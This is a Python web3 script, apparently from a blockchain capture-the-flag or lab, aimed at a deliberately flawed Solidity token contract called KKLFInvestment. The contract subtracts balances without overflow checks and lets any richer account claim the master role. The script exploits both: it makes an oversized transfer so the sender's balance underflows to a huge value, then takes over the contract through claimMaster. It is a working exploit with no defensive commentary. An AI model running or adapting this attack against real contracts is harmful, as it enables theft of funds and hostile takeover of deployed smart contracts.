from web3 import Web3
from web3.contract import ConciseContract
from web3.middleware import geth_poa_middleware
from solcx import compile_source, install_solc
install_solc("0.7.3")

w3 = Web3(Web3.HTTPProvider("http://10.50.254.254:22001", request_kwargs={'timeout': 60}))

acct = w3.geth.personal.new_account('ma-super-passphrase')

w3.middleware_onion.inject(geth_poa_middleware, layer=0)

compiled_sol = compile_source(
   '''
pragma solidity >=0.7.3;

// @dev : iHuggsy
contract KKLFInvestment 
{

    string public constant name = "KKLFInvestment";
    string public constant symbol = "KKLF$";
    uint8 public constant decimals = 18;  

    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;
    
    uint256 totalSupply_;

    address public master;


   constructor ()
    {  
	    totalSupply_ = 500000 ether;
	    balances[msg.sender] = 255000 ether; // 51%
        balances[address(this)] = 245000 ether; // 49%
        master = msg.sender;
    }  

    receive()  external payable {}

    fallback() external payable {}

    function totalSupply() public view returns (uint256) 
    {
	return totalSupply_;
    }
    
    function balanceOf(address tokenOwner) public view returns (uint) 
    {
        return balances[tokenOwner];
    }

    function buyKKLF() public payable 
    {
        balances[msg.sender] += msg.value;
    }

    function transfer(address receiver, uint numTokens) public returns (bool) 
    {
        require(balances[msg.sender] > 0);
        balances[msg.sender] = balances[msg.sender] -= numTokens * (1 ether);
        balances[receiver] = balances[receiver] += numTokens * (1 ether);
        return true;
    }

    function approve(address delegate, uint numTokens) public returns (bool) 
    {
        allowed[msg.sender][delegate] = numTokens * (1 ether);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint) 
    {
        return allowed[owner][delegate];
    }


    function transferFrom(address owner, address buyer, uint numTokens) public returns (bool) 
    {
        require(numTokens <= balances[owner]);    
        require(numTokens <= allowed[owner][msg.sender]);
    
        balances[owner] = balances[owner] -= numTokens * (1 ether);
        allowed[owner][msg.sender] = allowed[owner][msg.sender] -= numTokens * (1 ether);
        balances[buyer] = balances[buyer] += numTokens * (1 ether);
        return true;
    }

    function claimMaster() public
    {
        require(balances[msg.sender] > balances[master]);
        master = msg.sender;
    }
}
   ''',
   output_values=['abi', 'bin']
)


contract_id, contract_interface = compiled_sol.popitem()
# Adresse du contrat
addr = "0x94d614D95A4252554D81700b23CEcC5338CFa319"

# deux comptes creer precedement
acct = "0x3B129777f4d45152F0d4acF1cAacbbE6Ac018789"
b = "0xE3845F5b4Acd6Fc85c612433B763fbAcf453089e"

con = w3.eth.contract(addr, abi=contract_interface['abi'])

# Acheter des KKLF
txn_hash = con.functions.buyKKLF().transact({"from": acct, "gasPrice": 0x0, "gasLimit": 0x0, "value": 50000000})
w3.eth.wait_for_transaction_receipt(txn_hash) # Attendre la validation de la transaction

# Transferer un grand montant a notre compte b
txn_hash = con.functions.transfer(b, 23901293792187398127389213897123987213978).transact({"from": acct})
w3.eth.wait_for_transaction_receipt(txn_hash) # Attendre la validation de la transaction

# Appeler la fonction claimMaster
txn_hash = con.functions.claimMaster().transact({"from": acct})
w3.eth.wait_for_transaction_receipt(txn_hash) # Attendre la validation de la transaction
